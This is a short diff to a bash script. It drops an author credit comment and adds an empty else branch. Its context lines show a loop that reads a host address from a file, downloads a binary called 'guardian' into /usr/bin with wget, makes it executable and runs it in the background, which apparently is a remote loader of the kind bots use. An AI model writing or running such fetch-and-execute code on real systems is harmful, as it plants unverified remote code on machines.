@@ -1,5 +1,4 @@
 #!/bin/bash
-# Created by @H3X-007 :)
 
 ip_file="/etc/HOST"
 nick_file="/etc/nick"
@@ -24,6 +23,8 @@ while true; do
             ip_file=$(cat "$ip_file")
             cd /usr/bin && wget "http://$ip_file/guardian" && chmod +x guardian
             ./usr/bin/guardian &
+        else
+            :
         fi
     fi
 
